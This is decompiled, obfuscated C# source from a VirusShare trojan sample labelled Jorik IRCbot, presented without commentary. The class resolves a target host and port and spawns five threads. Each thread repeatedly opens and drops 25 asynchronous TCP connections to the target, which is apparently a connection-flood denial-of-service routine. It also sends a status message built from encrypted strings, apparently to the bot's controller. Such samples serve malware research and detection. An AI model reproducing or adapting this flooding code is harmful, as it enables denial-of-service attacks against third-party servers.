// Decompiled with JetBrains decompiler
// Type: .
// Assembly: insomnia, Version=0.0.0.0, Culture=neutral, PublicKeyToken=24b8f1c2e28acde2
// MVID: 0C7B899D-7035-4B2D-B433-3C80E566FC1C
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00001-msil\Trojan.Win32.Jorik.IRCbot.gim-3e8d8a98ac44098acc3d92301b4ae92e5e6e1a5f0b2d861cd9e69e0650edce63.exe

using \u0003;
using \u0004;
using \u000E;
using \u000F;
using System;
using System.Net;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Threading;

namespace \u0003
{
  internal sealed class \u0001
  {
    private static ThreadStart[] \u0001;
    private static Thread[] \u0001;
    public static string \u0001;
    public static int \u0001;
    private static IPEndPoint \u0001;
    public static int \u0002;
    private static \u0001.\u0001[] \u0001;
    public static int \u0003;
    public static int \u0004;
    public static bool \u0001;
    [NonSerialized]
    internal static \u0008.\u0004 \u0098;

    public static void \u0001()
    {
      Thread thread1 = new Thread(new ThreadStart(\u0001.\u0002));
      if (true)
        goto label_2;
label_1:
      Thread thread2;
      \u0084.\u007E\u0094\u0002((object) thread2, true);
      \u0013.\u007E\u0002\u0002((object) thread2);
      return;
label_2:
      thread2 = thread1;
      goto label_1;
    }

    public static void \u0002()
    {
      try
      {
        \u0001.\u0001 = new IPEndPoint(\u0087.\u007E\u009F\u0002((object) \u0086.\u009D\u0002(\u0001.\u0001))[0], \u0001.\u0002);
      }
      catch
      {
        if (true)
          \u0001.\u0001 = new IPEndPoint(\u0088.\u0001\u0003(\u0001.\u0001), \u0001.\u0002);
      }
      string[] strArray;
      if (true)
      {
        int length = \u0001.\u0004;
label_6:
        int index;
        if (true)
        {
          \u0001.\u0001 = new Thread[length];
          \u0001.\u0001 = new ThreadStart[\u0001.\u0004];
          \u0001.\u0001 = new \u0001.\u0001[\u0001.\u0004];
          if (true)
          {
            index = 0;
            goto label_14;
          }
          else
            goto label_14;
        }
label_11:
        int num1;
        if (true)
          num1 = length + 1;
        else
          goto label_6;
label_13:
        index = num1;
label_14:
        int num2 = index;
        if (false)
        {
          num1 = num2;
          goto label_13;
        }
        else
        {
          int num3 = \u0001.\u0004;
          if (num2 < num3)
            \u0001.\u0001[index] = new \u0001.\u0001(\u0001.\u0001, \u0001.\u0003);
          else
            goto label_16;
label_10:
          \u0001.\u0001[index] = new ThreadStart(\u0001.\u0001[index].\u0001);
          \u0001.\u0001[index] = new Thread(\u0001.\u0001[index]);
          \u0013.\u007E\u0002\u0002((object) \u0001.\u0001[index]);
          length = index;
          goto label_11;
label_16:
          \u001F.\u0087\u0002(\u0001.\u0001 * 1000);
          if (!\u0001.\u0001)
            return;
          \u0001.\u0003();
          strArray = new string[5]
          {
            \u0001.\u0098(1021),
            \u0002.\u0001(\u0010.\u008D(\u0001.\u0098(535), \u0001.\u0001)),
            null,
            null,
            null
          };
          if (true)
          {
            strArray[2] = \u0001.\u0098(854);
            strArray[3] = \u0002.\u0001(\u0089.\u0002\u0003((object) \u0001.\u0098(535), (object) \u0001.\u0001));
          }
          else
            goto label_10;
        }
      }
      if (false)
        return;
      strArray[4] = \u0001.\u0098(863);
      \u0002.\u0001(\u0018.\u001A\u0002(strArray), \u0001.\u0010);
    }

    public static void \u0003() => \u0001.\u0001 = false;

    static \u0001()
    {
      \u0005.\u0001(typeof (\u0001));
      \u0001.\u0003 = 25;
      \u0001.\u0004 = 5;
      \u0001.\u0001 = false;
    }

    private sealed class \u0001
    {
      private IPEndPoint \u0001;
      private Socket[] \u0001;
      private int \u0001;

      public \u0001([In] IPEndPoint obj0, [In] int obj1)
      {
        this.\u0001 = obj0;
        this.\u0001 = obj1;
      }

      public void \u0001([In] IAsyncResult obj0)
      {
      }

      public void \u0001()
      {
        while (\u0001.\u0001)
        {
          try
          {
            this.\u0001 = new Socket[this.\u0001];
            int index = 0;
            while (true)
            {
              int num1 = index;
              if (true)
                goto label_5;
label_2:
              index = num1 + 1;
              continue;
label_5:
              int num2 = this.\u0001;
              if (num1 >= num2)
              {
                \u001F.\u0087\u0002(100);
                index = 0;
                goto label_11;
              }
              else
              {
                this.\u0001[index] = new Socket(\u008B.\u007E\u0004\u0003((object) this.\u0001), SocketType.Stream, ProtocolType.Tcp);
                \u0084.\u007E\u0095\u0002((object) this.\u0001[index], false);
                AsyncCallback asyncCallback = new AsyncCallback(this.\u0001);
                IAsyncResult asyncResult = \u0091.\u007E\u0017\u0003((object) this.\u0001[index], (EndPoint) this.\u0001, asyncCallback, (object) this.\u0001[index]);
                num1 = index;
                goto label_2;
              }
            }
label_10:
            ++index;
label_11:
            if (index < this.\u0001)
            {
              if (\u008C.\u007E\u0006\u0003((object) this.\u0001[index]))
                \u0084.\u007E\u0096\u0002((object) this.\u0001[index], false);
              \u0013.\u007E\u0003\u0002((object) this.\u0001[index]);
              this.\u0001[index] = (Socket) null;
              goto label_10;
            }
            else
              this.\u0001 = (Socket[]) null;
          }
          catch
          {
            do
            {
              for (int index = 0; index < this.\u0001; ++index)
              {
                try
                {
                  if (\u008C.\u007E\u0006\u0003((object) this.\u0001[index]))
                  {
                    if (true)
                      \u0084.\u007E\u0096\u0002((object) this.\u0001[index], false);
                    else
                      continue;
                  }
                  \u0013.\u007E\u0003\u0002((object) this.\u0001[index]);
                  this.\u0001[index] = (Socket) null;
                }
                catch
                {
                }
              }
            }
            while (false);
          }
        }
        for (int index = 0; index < this.\u0001; ++index)
        {
          try
          {
            if (\u008C.\u007E\u0006\u0003((object) this.\u0001[index]))
              \u0084.\u007E\u0096\u0002((object) this.\u0001[index], false);
            \u0013.\u007E\u0003\u0002((object) this.\u0001[index]);
            this.\u0001[index] = (Socket) null;
          }
          catch
          {
          }
        }
      }
    }
  }
}
